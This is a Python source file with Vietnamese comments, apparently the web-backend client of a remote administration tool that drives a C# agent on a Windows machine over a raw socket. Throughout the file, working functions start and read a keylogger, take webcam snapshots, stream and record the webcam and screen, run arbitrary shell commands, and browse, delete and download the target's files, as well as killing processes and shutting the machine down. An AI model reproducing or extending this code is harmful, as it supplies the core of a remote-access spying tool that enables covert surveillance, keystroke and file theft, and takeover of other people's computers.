import socket
import json
import time
import threading # Thêm threading để xử lý khóa (lock) tránh treo

class PersistentRemoteClient:
    _instances = {}
    
    # --- THÊM KHÓA LOCK ĐỂ TRÁNH XUNG ĐỘT GIỮA STREAM VÀ LỆNH KHÁC ---
    _lock = threading.Lock()

    def __init__(self, host, port, timeout=60):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.socket = None
        self.connected = False
        # Xóa self.reader và self.writer vì chúng gây lỗi UTF-8 với dữ liệu Video

    @classmethod
    def get_or_create(cls, session_id, host, port, timeout=60):
        """
        Factory method: Lấy client instance cho session_id, nếu chưa có thì tạo mới
        """
        if session_id not in cls._instances:
            instance = cls(host, port, timeout)
            try:
                instance.connect()
                cls._instances[session_id] = instance
            except:
                return None
        else:
            # Kiểm tra xem connection còn sống không
            instance = cls._instances[session_id]
            if not instance.connected:
                try:
                    instance.connect()
                except:
                    # Nếu connect lại thất bại thì xóa instance lỗi đi
                    del cls._instances[session_id]
                    return None
                    
        return cls._instances[session_id]

    @classmethod
    def disconnect_session(cls, session_id):
        if session_id in cls._instances:
            client = cls._instances[session_id]
            client.disconnect()
            del cls._instances[session_id]

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(self.timeout)
        self.socket.connect((self.host, self.port))
        self.connected = True
        # KHÔNG tạo makefile nữa để tránh lỗi decode UTF-8

    def disconnect(self):
        if self.socket:
            try:
                # Gửi lệnh QUIT trước khi đóng
                self.socket.sendall(b"QUIT\n") # Dùng sendall thay vì writer.write
                self.socket.close()
            except:
                pass
        self.socket = None
        self.connected = False

    # ==================== CÁC HÀM HỖ TRỢ RAW SOCKET (MỚI) ====================
    # Những hàm này thay thế cho self.reader/writer để an toàn với Video/Ảnh
    
    def _send_str(self, text):
        """Gửi string an toàn"""
        if not text.endswith('\n'): text += '\n'
        self.socket.sendall(text.encode('utf-8'))

    def _recv_line(self):
        """Đọc 1 dòng text, không đọc lấn sang phần binary"""
        line = b''
        while True:
            try:
                char = self.socket.recv(1)
                if not char: break
                if char == b'\n': break
                line += char
            except socket.timeout:
                break
        return line.decode('utf-8', errors='ignore').strip()

    def _recv_bytes(self, num_bytes):
        """Đọc chính xác số bytes binary (cho ảnh/video)"""
        data = b''
        while len(data) < num_bytes:
            chunk = self.socket.recv(min(4096, num_bytes - len(data)))
            if not chunk: break
            data += chunk
        return data
    # =========================================================================

    def send_command(self, command_type, sub_command=None, args=None):
        """
        Gửi lệnh và nhận phản hồi
        command_type: PROCESS, APPLICATION, KEYLOG, TAKEPIC, SHUTDOWN...
        """
        if not self.connected:
            return {"status": "error", "message": "Not connected"}
        
        # Dùng lock để đảm bảo không ai chen ngang khi đang gửi lệnh này
        # (Đặc biệt quan trọng khi đang bật Webcam Stream)
        with self._lock:
            try:
                # Gửi loại lệnh chính
                self._send_str(command_type) # Thay cho writer.write

                response_data = None
                status = "error"
                msg = ""

                # --- Xử lý logic từng loại lệnh (GIỮ NGUYÊN LOGIC CŨ) ---
                
                if command_type == "PROCESS" or command_type == "APPLICATION":
                    if sub_command == "XEM":
                        self._send_str("XEM")
                        
                        # Đọc số lượng
                        count_str = self._recv_line() # Thay cho reader.readline
                        if count_str.isdigit():
                            count = int(count_str)
                            data_list = []
                            for _ in range(count):
                                # Đọc từng dòng thông tin process
                                p_name = self._recv_line()
                                p_id = self._recv_line()
                                p_threads = self._recv_line()
                                
                                data_list.append({
                                    "name": p_name,
                                    "id": p_id,
                                    "threads": p_threads
                                })
                            response_data = data_list
                            status = "success"
                    
                    elif sub_command == "KILL":
                        self._send_str("KILL")
                        self._send_str("KILLID")
                        self._send_str(str(args)) # args là ID
                        msg = self._recv_line()
                        status = "success"
                        
                    elif sub_command == "START":
                        self._send_str("START")
                        self._send_str("STARTID")
                        # Map tên app thông dụng (giữ nguyên logic cũ)
                        app_name = str(args)
                        aliases = {
                            "edge": "msedge",
                            "chrome": "chrome",
                            "coc coc": "browser",
                            "word": "winword",
                            "excel": "excel",
                            "powerpoint": "powerpnt",
                            "notepad": "notepad",
                            "calc": "calc",
                            "paint": "mspaint",
                            "cmd": "cmd"
                        }
                        if app_name.lower() in aliases:
                            app_name = aliases[app_name.lower()]
                            
                        self._send_str(app_name)
                        msg = self._recv_line()
                        status = "success"
                    
                    # Gửi QUIT để kết thúc phiên lệnh con
                    self._send_str("QUIT")

                elif command_type == "TAKEPIC":
                    self._send_str("TAKE")
                    # Đọc kích thước ảnh
                    size_str = self._recv_line()
                    if size_str.isdigit():
                        size = int(size_str)
                        if size > 0:
                            # Đọc dữ liệu ảnh (Binary) - Dùng hàm mới an toàn
                            img_data = self._recv_bytes(size)
                            # Convert sang base64 để gửi về frontend
                            import base64
                            response_data = base64.b64encode(img_data).decode('utf-8')
                            status = "success"
                    self._send_str("QUIT")

                elif command_type == "KEYLOG":
                    if sub_command == "PRINT":
                        self._send_str("PRINT")
                        response_data = self._recv_line()
                        status = "success"
                    elif sub_command == "HOOK":
                        self._send_str("HOOK")
                        status = "success"
                        msg = "Keylogger started"
                    elif sub_command == "UNHOOK":
                        self._send_str("UNHOOK")
                        status = "success"
                        msg = "Keylogger stopped"
                    elif sub_command == "CLEAR":
                        self._send_str("CLEAR")
                        msg = self._recv_line()
                        status = "success"
                    elif sub_command == "STATUS":
                        self._send_str("STATUS")
                        response_data = self._recv_line()
                        status = "success"
                    self._send_str("QUIT")

                elif command_type == "CMD":
                    if sub_command == "EXEC":
                        self._send_str("EXEC")
                        # Gửi câu lệnh thực tế (args = "dir", "ipconfig"...)
                        self._send_str(str(args))
                        
                        # Đọc độ dài dữ liệu trả về
                        size_str = self._recv_line()
                        
                        if size_str.isdigit():
                            size = int(size_str)
                            if size > 0:
                                output_bytes = self._recv_bytes(size)
                                response_data = output_bytes.decode('utf-8', errors='replace')
                            else:
                                response_data = "" 
                            status = "success"  # <--- ĐÚNG: Chỉ success khi có size hợp lệ
                        else:
                            # Timeout hoặc Server không phản hồi đúng giao thức
                            response_data = "Error: Server not responding (Timeout) or Protocol Mismatch."
                            status = "error"    # <--- Báo lỗi rõ ràng
                    
                    # Luôn gửi QUIT để thoát vòng lặp case "CMD" bên C# để nhả lock
                    self._send_str("QUIT")

                elif command_type == "SHUTDOWN":
                    # Server C# sẽ tự shutdown máy
                    status = "success"
                    self._send_str("QUIT")

                elif command_type == "RESTART":
                    status = "success"
                    self._send_str("QUIT")

                return {
                    "status": status,
                    "data": response_data,
                    "message": msg
                }
            
            except Exception as e:
                self.connected = False
                return {"status": "error", "message": str(e)}

    # --- HELPER MỚI: Xử lý chung cho Webcam và Screen ---
    def _generic_recorder_action(self, module_name, action, is_stop=False):
        """
        Hàm xử lý chung cho Webcam và Screen.
        module_name: "WEBCAM" hoặc "SCREEN_REC"
        action: "ON", "OFF", "START_REC", "STOP_REC"...
        is_stop: Nếu là lệnh dừng quay (STOP_REC) thì cần xử lý nhận file
        """
        if not self.connected: 
            return {"success": False, "message": "Not connected"}
        
        with self._lock:
            try:
                self._send_str(module_name) # Gửi tên module (VD: WEBCAM)
                self._send_str(action)      # Gửi lệnh (VD: START_REC)
                
                # Nếu KHÔNG phải lệnh Stop Recording, chỉ cần đọc phản hồi đơn giản
                if not is_stop:
                    response = self._recv_line()
                    self._send_str("QUIT")
                    return {"success": True, "message": response} # Coi như luôn true nếu không exception
                
                # --- XỬ LÝ RIÊNG CHO STOP RECORDING (Nhận file) ---
                response = self._recv_line()
                if "STOPPED" not in response: # Check lỏng để khớp cả 2
                    self._send_str("QUIT")
                    return {"success": False, "message": response}
                
                # Parse metadata: "STOPPED|filename|filesize|duration"
                parts = response.split('|')
                filename = parts[1] if len(parts) > 1 else "video.avi"
                duration = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 0
                
                # Nhận size thật để tải binary
                size_check = self._recv_line()
                if not size_check.isdigit():
                    self._send_str("QUIT")
                    return {"success": False, "message": "Protocol Error"}
                
                real_size = int(size_check)
                video_data = self._recv_bytes(real_size) if real_size > 0 else b''
                
                self._send_str("QUIT")
                return {
                    "success": True, 
                    "message": "Saved", 
                    "filename": filename, 
                    "file_size": real_size, 
                    "video_data": video_data, 
                    "duration": duration
                }

            except Exception as e:
                return {"success": False, "message": str(e)}
            

    def webcam_on(self):
        return self._generic_recorder_action("WEBCAM", "ON")

    def webcam_off(self):
        return self._generic_recorder_action("WEBCAM", "OFF")
        
    def webcam_start_recording(self):
        return self._generic_recorder_action("WEBCAM", "START_REC")
        
    def webcam_stop_recording(self):
        return self._generic_recorder_action("WEBCAM", "STOP_REC", is_stop=True)
    
    def webcam_get_frame(self):
        """
        Lấy frame cho streaming.
        Dùng lock không chặn (blocking=False) để tránh treo UI nếu đang Start/Stop recording
        """
        if not self.connected: return None
        
        # Nếu đang bận gửi lệnh khác (ví dụ Start Rec), bỏ qua frame này để tránh treo
        if not self._lock.acquire(timeout=0.5):
            return None
            
        try:
            self._send_str("WEBCAM")
            self._send_str("GET_FRAME")
            
            size_str = self._recv_line()
            # Kiểm tra size hợp lệ
            if not size_str.isdigit():
                self._send_str("QUIT")
                return None
            
            size = int(size_str)
            if size == 0:
                self._send_str("QUIT")
                return None
            
            # Đọc binary an toàn
            frame_data = self._recv_bytes(size)
            self._send_str("QUIT")
            return frame_data
        except Exception:
            return None
        finally:
            self._lock.release()
            
    def webcam_status(self):
        if not self.connected: return {"camera_on": False, "recording": False}
        with self._lock:
            try:
                self._send_str("WEBCAM")
                self._send_str("STATUS")
                response = self._recv_line()
                self._send_str("QUIT")
                # Parse: "camera_on:true|recording:false"
                parts = response.split('|')
                is_on = "true" in parts[0] if len(parts) > 0 else False
                is_rec = "true" in parts[1] if len(parts) > 1 else False
                return {"camera_on": is_on, "recording": is_rec}
            except: 
                return {"camera_on": False, "recording": False}
    
    # ==================== MODULE SCREEN RECORDER (MỚI) ====================
    
    def screen_start_stream(self):
        return self._generic_recorder_action("SCREEN_REC", "START")

    def screen_stop_stream(self):
        return self._generic_recorder_action("SCREEN_REC", "STOP")

    def screen_start_recording(self):
        return self._generic_recorder_action("SCREEN_REC", "START_REC")

    def screen_stop_recording(self):
        return self._generic_recorder_action("SCREEN_REC", "STOP_REC", is_stop=True)
    
    def screen_get_frame(self):
        """
        Lấy frame màn hình. 
        Cần lock non-blocking để tránh treo giao diện khi đang ghi hình.
        """
        if not self.connected: return None
        
        # Thử lấy lock, nếu server đang bận (ví dụ đang lưu file) thì bỏ qua frame này
        if not self._lock.acquire(timeout=0.5): 
            return None
            
        try:
            self._send_str("SCREEN_REC") # Gửi tên module
            self._send_str("GET_FRAME")  # Gửi lệnh lấy ảnh
            
            size_str = self._recv_line()
            # Kiểm tra size hợp lệ
            if not size_str.isdigit():
                self._send_str("QUIT")
                return None
            
            size = int(size_str)
            if size == 0:
                self._send_str("QUIT")
                return None
            
            # Đọc binary ảnh an toàn
            frame_data = self._recv_bytes(size)
            self._send_str("QUIT")
            return frame_data
        except Exception:
            return None
        finally:
            self._lock.release()

    def screen_status(self):
        if not self.connected: return {"stream_on": False, "recording": False}
        with self._lock:
            try:
                self._send_str("SCREEN_REC")
                self._send_str("STATUS")
                response = self._recv_line()
                self._send_str("QUIT")
                parts = response.split('|')
                is_on = "true" in parts[0] if len(parts) > 0 else False
                is_rec = "true" in parts[1] if len(parts) > 1 else False
                return {"stream_on": is_on, "recording": is_rec}
            except: return {"stream_on": False, "recording": False}

    # ==================== HÀM TỰ RESET CMD SHELL ====================
   
    def shell_reset(self):
        """Gửi lệnh reset đường dẫn CMD về mặc định"""
        if not self.connected: return
        with self._lock:
            try:
                self._send_str("CMD")   # Vào module CMD
                self._send_str("RESET") # Gửi lệnh Reset biến toàn cục
                # Không cần đợi phản hồi vì Server sẽ tự thoát ra ngay
            except:
                pass
            
    # ==================== MODULE FILE HANDLING ====================

    def file_get_drives(self):
        """Lấy danh sách ổ đĩa"""
        if not self.connected: return {"success": False, "message": "Not connected"}
        
        with self._lock:
            try:
                self._send_str("FILE")
                self._send_str("GET_DRIVES")
                
                count_str = self._recv_line()
                drives = []
                
                if count_str.isdigit():
                    count = int(count_str)
                    for _ in range(count):
                        line = self._recv_line() # Format: C:\|Fixed|100GB Free
                        parts = line.split('|')
                        if len(parts) >= 3:
                            drives.append({
                                "path": parts[0],
                                "type": parts[1],
                                "info": parts[2]
                            })
                
                self._send_str("QUIT")
                return {"success": True, "drives": drives}
            except Exception as e:
                return {"success": False, "message": str(e)}

    def file_get_directory(self, path):
        """Lấy danh sách file/folder trong đường dẫn"""
        if not self.connected: return {"success": False, "message": "Not connected"}
        
        with self._lock:
            try:
                self._send_str("FILE")
                self._send_str("GET_DIR")
                self._send_str(path) # Gửi đường dẫn muốn xem
                
                response = self._recv_line()
                
                # Nếu response là ERROR
                if response == "ERROR":
                    err_msg = self._recv_line()
                    self._send_str("QUIT")
                    return {"success": False, "message": err_msg}
                
                # Nếu response là số lượng
                items = []
                if response.isdigit():
                    count = int(response)
                    for _ in range(count):
                        line = self._recv_line() # Format: TYPE|NAME|INFO
                        parts = line.split('|')
                        if len(parts) >= 3:
                            items.append({
                                "type": parts[0], # DIR hoặc FILE
                                "name": parts[1],
                                "size": parts[2]
                            })
                            
                self._send_str("QUIT")
                return {"success": True, "items": items, "current_path": path}
            except Exception as e:
                return {"success": False, "message": str(e)}

    def file_delete_item(self, path):
        """Xóa file hoặc folder"""
        if not self.connected: return {"success": False, "message": "Not connected"}
        
        with self._lock:
            try:
                self._send_str("FILE")
                self._send_str("DELETE")
                self._send_str(path)
                
                status = self._recv_line() # SUCCESS hoặc ERROR
                message = self._recv_line()
                
                self._send_str("QUIT")
                return {"success": (status == "SUCCESS"), "message": message}
            except Exception as e:
                return {"success": False, "message": str(e)}

    def file_download(self, path):
        """Tải file về (Binary)"""
        if not self.connected: return {"success": False, "message": "Not connected"}
        
        with self._lock:
            try:
                self._send_str("FILE")
                self._send_str("DOWNLOAD")
                self._send_str(path)
                
                size_str = self._recv_line()
                
                if not size_str.isdigit() or int(size_str) == 0:
                    self._send_str("QUIT")
                    return {"success": False, "message": "File not found or empty"}
                
                file_size = int(size_str)
                # Nhận Binary Data (dùng hàm _recv_bytes có sẵn)
                file_data = self._recv_bytes(file_size)
                
                self._send_str("QUIT")
                
                # Trả về bytes để Django tạo file response
                return {
                    "success": True, 
                    "filename": path.split('\\')[-1], # Lấy tên file từ path
                    "data": file_data
                }
            except Exception as e:
                return {"success": False, "message": str(e)}

    # ==================== MODULE SYSTEM INFORMATION ====================

    def get_system_stats(self):
        if not self.connected:
            return {"status": "error", "message": "Not connected"}
            
        with self._lock:
            try:
                # --- THÊM TIMEOUT TẠM THỜI ---
                # Chỉ chờ C# trả lời trong 2 giây. Nếu lâu hơn -> Bỏ qua.
                self.socket.settimeout(2.0) 
                
                start_time = time.time()
                
                self._send_str("SYSTEM_INFO")
                response = self._recv_line()
                
                end_time = time.time()
                
                # --- TRẢ LẠI TIMEOUT MẶC ĐỊNH ---
                self.socket.settimeout(self.timeout) 
                
                # ... (Phần xử lý latency và data giữ nguyên) ...
                latency = round((end_time - start_time) * 1000, 0)
                
                # ... (Code parse data giữ nguyên) ...
                
                if response.startswith("ERROR"):
                     return {"status": "error", "message": response}

                parts = response.split('|')
                def get_part(idx, default="?"): return parts[idx] if len(parts) > idx else default

                data = {
                    "cpu_load": get_part(0, "0"),
                    "ram_free": get_part(1, "0"),
                    "battery": get_part(2, "Unknown"),
                    "hostname": get_part(3, "Unknown"),
                    "os_info": get_part(4, "Unknown"),
                    "internal_ip": get_part(5, "Unknown"),
                    "latency": latency
                }
                
                return {"status": "success", "data": data}
                
            except socket.timeout:
                # Nếu timeout -> Coi như server bận, không ngắt kết nối
                # Trả về status 'busy' để frontend biết mà không báo lỗi
                return {"status": "error", "message": "Timeout (Server Busy)"}
                
            except Exception as e:
                self.connected = False
                return {"status": "error", "message": str(e)}